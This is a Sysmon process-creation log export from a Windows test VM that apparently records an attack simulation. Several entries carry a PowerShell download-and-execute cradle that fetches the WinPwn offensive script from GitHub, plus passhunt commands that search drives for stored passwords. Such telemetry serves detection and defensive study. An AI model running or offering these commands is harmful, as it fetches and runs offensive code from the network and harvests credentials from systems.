Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\cmd.exe"" /c start powershell -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s E:\ -r '(password|passwort|passwd| -p | -p=| -pw |
          -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
        g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,,,,,,,1,9508,,10.0.22621.1635 (WinBuild.160101.0800),"MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:57.219

ProcessGuid: {fda94052-3d81-658d-9602-000000000b00}

ProcessId: 7268

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""C:\Windows\system32\cmd.exe"" /c start powershell -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s E:\ -r '(password|passwort|passwd| -p | -p=| -pw |

          -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo

        g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {fda94052-3d6c-658d-8902-000000000b00}

ParentProcessId: 2548

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
passhunt -local $true -noninteractive}

ParentUser: WINDEV2309EVAL\User",Info,Cmd.Exe,"""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
passhunt -local $true -noninteractive}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-3d6c-658d-8902-000000000b00},2548,WINDEV2309EVAL\User,,{fda94052-3d81-658d-9602-000000000b00},7044,7268,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:18:57.2218508Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:18:57.219,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:18:57.2218508Z""/>
      <EventRecordID>9508</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:18:57.219</Data>
      <Data Name=""ProcessGuid"">{fda94052-3d81-658d-9602-000000000b00}</Data>
      <Data Name=""ProcessId"">7268</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1635 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\cmd.exe"" /c start powershell -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s E:\ -r '(password|passwort|passwd| -p | -p=| -pw |
          -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
        g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;""</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-3d6c-658d-8902-000000000b00}</Data>
      <Data Name=""ParentProcessId"">2548</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
passhunt -local $true -noninteractive}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:57.219

ProcessGuid: {fda94052-3d81-658d-9602-000000000b00}

ProcessId: 7268

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""C:\Windows\system32\cmd.exe"" /c start powershell -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s E:\ -r '(password|passwort|passwd| -p | -p=| -pw |

          -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo

        g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {fda94052-3d6c-658d-8902-000000000b00}

ParentProcessId: 2548

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" &amp; {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
passhunt -local $true -noninteractive}

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"powershell  -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s D:\ -r '(password|passwort|passwd| -p | -p=| -pw |",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,,1,9507,,10.0.22621.2215 (WinBuild.160101.0800),"MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:57.212

ProcessGuid: {fda94052-3d81-658d-9402-000000000b00}

ProcessId: 7416

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: powershell  -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s D:\ -r '(password|passwort|passwd| -p | -p=| -pw |

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-3d81-658d-9202-000000000b00}

ParentProcessId: 10868

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""C:\Windows\system32\cmd.exe"" /c start powershell -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s D:\ -r '(password|passwort|passwd| -p | -p=| -pw |

          -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo

        g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;""

ParentUser: WINDEV2309EVAL\User",Info,PowerShell.EXE,"""C:\Windows\system32\cmd.exe"" /c start powershell -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s D:\ -r '(password|passwort|passwd| -p | -p=| -pw |
          -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
        g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;""",C:\Windows\System32\cmd.exe,{fda94052-3d81-658d-9202-000000000b00},10868,WINDEV2309EVAL\User,,{fda94052-3d81-658d-9402-000000000b00},7044,7416,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:18:57.2133954Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:18:57.212,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:18:57.2133954Z""/>
      <EventRecordID>9507</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:18:57.212</Data>
      <Data Name=""ProcessGuid"">{fda94052-3d81-658d-9402-000000000b00}</Data>
      <Data Name=""ProcessId"">7416</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2215 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">powershell  -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s D:\ -r '(password|passwort|passwd| -p | -p=| -pw |</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-3d81-658d-9202-000000000b00}</Data>
      <Data Name=""ParentProcessId"">10868</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\system32\cmd.exe"" /c start powershell -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s D:\ -r '(password|passwort|passwd| -p | -p=| -pw |
          -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
        g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;""</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:57.212

ProcessGuid: {fda94052-3d81-658d-9402-000000000b00}

ProcessId: 7416

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: powershell  -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s D:\ -r '(password|passwort|passwd| -p | -p=| -pw |

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-3d81-658d-9202-000000000b00}

ParentProcessId: 10868

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""C:\Windows\system32\cmd.exe"" /c start powershell -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s D:\ -r '(password|passwort|passwd| -p | -p=| -pw |

          -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo

        g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;""

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding",-,WinDev2309Eval,,C:\Windows\system32\,-,,,,,,,1,9506,,-,"MD5=9F6CCA1BECAEEC3FE38A7D322A3204A8,SHA256=9F43EDB6639B10481A8FCC0734BD66AF0A9021D1723D1377A625C6A66FCF3DDB,IMPHASH=5B10822D7E57F54AD8CF4D784949C5C5",C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:57.211

ProcessGuid: {fda94052-3d81-658d-9302-000000000b00}

ProcessId: 2144

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=9F6CCA1BECAEEC3FE38A7D322A3204A8,SHA256=9F43EDB6639B10481A8FCC0734BD66AF0A9021D1723D1377A625C6A66FCF3DDB,IMPHASH=5B10822D7E57F54AD8CF4D784949C5C5

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,-,-,-,{00000000-0000-0000-0000-000000000000},932,-,,{fda94052-3d81-658d-9302-000000000b00},7044,2144,-,,,,,"
      ",-,,,,,,2023-12-28T09:18:57.2129821Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:18:57.211,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:18:57.2129821Z""/>
      <EventRecordID>9506</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:18:57.211</Data>
      <Data Name=""ProcessGuid"">{fda94052-3d81-658d-9302-000000000b00}</Data>
      <Data Name=""ProcessId"">2144</Data>
      <Data Name=""Image"">C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe</Data>
      <Data Name=""FileVersion"">-</Data>
      <Data Name=""Description"">-</Data>
      <Data Name=""Product"">-</Data>
      <Data Name=""Company"">-</Data>
      <Data Name=""OriginalFileName"">-</Data>
      <Data Name=""CommandLine"">""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=9F6CCA1BECAEEC3FE38A7D322A3204A8,SHA256=9F43EDB6639B10481A8FCC0734BD66AF0A9021D1723D1377A625C6A66FCF3DDB,IMPHASH=5B10822D7E57F54AD8CF4D784949C5C5</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">932</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:57.211

ProcessGuid: {fda94052-3d81-658d-9302-000000000b00}

ProcessId: 2144

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=9F6CCA1BECAEEC3FE38A7D322A3204A8,SHA256=9F43EDB6639B10481A8FCC0734BD66AF0A9021D1723D1377A625C6A66FCF3DDB,IMPHASH=5B10822D7E57F54AD8CF4D784949C5C5

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\cmd.exe"" /c start powershell -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s D:\ -r '(password|passwort|passwd| -p | -p=| -pw |
          -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
        g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,,,,,,,1,9505,,10.0.22621.1635 (WinBuild.160101.0800),"MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:57.203

ProcessGuid: {fda94052-3d81-658d-9202-000000000b00}

ProcessId: 10868

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""C:\Windows\system32\cmd.exe"" /c start powershell -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s D:\ -r '(password|passwort|passwd| -p | -p=| -pw |

          -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo

        g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {fda94052-3d6c-658d-8902-000000000b00}

ParentProcessId: 2548

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
passhunt -local $true -noninteractive}

ParentUser: WINDEV2309EVAL\User",Info,Cmd.Exe,"""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
passhunt -local $true -noninteractive}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-3d6c-658d-8902-000000000b00},2548,WINDEV2309EVAL\User,,{fda94052-3d81-658d-9202-000000000b00},7044,10868,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:18:57.2047634Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:18:57.203,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:18:57.2047634Z""/>
      <EventRecordID>9505</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:18:57.203</Data>
      <Data Name=""ProcessGuid"">{fda94052-3d81-658d-9202-000000000b00}</Data>
      <Data Name=""ProcessId"">10868</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1635 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\cmd.exe"" /c start powershell -Command ""C:\Users\User\AppData\Local\Temp\passhunt.exe -s D:\ -r '(password|passwort|passwd| -p | -p=| -pw |
          -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
        g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;""</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
